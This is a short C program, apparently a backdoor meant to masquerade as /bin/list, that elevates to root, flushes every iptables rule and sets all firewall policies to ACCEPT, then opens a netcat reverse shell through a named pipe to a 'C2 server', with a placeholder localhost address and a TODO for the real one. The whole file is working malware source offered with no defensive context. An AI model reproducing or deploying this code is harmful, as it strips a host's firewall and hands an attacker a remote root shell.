#include <stdlib.h>
#include <unistd.h>

//This C code does all the naughty things
//will be in /bin/list
int main(int argc, char **argv){
	setuid(0);
	setgid(0);
	//gets rid of firewall rules
	system("iptables -F");
	system("iptables -t mangle -F");
	system("iptables -P INPUT ACCEPT");
	system("iptables -P OUTPUT ACCEPT");
	system("iptables -P FORWARD ACCEPT");

	//Names pipe to call back to C2 server
	system("[ ! -p /tmp/2slo ] && mkfifo /tmp/2slo");

	//TODO add C2 ip and port
	system("(/bin/bash 0</tmp/2slo | nc 127.0.0.1 6969 1>/tmp/2slo) &");

}
